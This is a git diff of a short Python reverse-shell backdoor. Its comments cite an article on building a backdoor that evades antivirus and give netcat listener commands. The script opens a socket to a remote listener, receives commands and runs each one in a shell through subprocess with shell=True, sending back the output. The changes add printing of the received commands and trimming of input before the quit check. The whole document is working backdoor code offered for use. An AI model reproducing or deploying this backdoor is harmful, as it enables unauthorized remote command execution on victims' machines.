@@ -5,7 +5,9 @@
 # This piece of software code is licensed under the FreeBSD license..
 #
 # Visit http://www.freebsd.org/copyright/freebsd-license.html for more information.
-# nc -l 8888
+# https://www.trustedsec.com/june-2011/creating-a-13-line-backdoor-worry-free-of-av/
+# nc -l 8888 on mac
+# nc -lvp 8888 on linux
 import socket, subprocess
 
 HOST = '127.0.0.1'  # The remote host
@@ -19,8 +21,9 @@ s.send('[*] Connection Established!')
 while 1:
     # recieve shell command
     data = s.recv(1024)
+    print(data)
     # if its quit, then break out and close socket
-    if data == "quit": break
+    if data.strip() == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
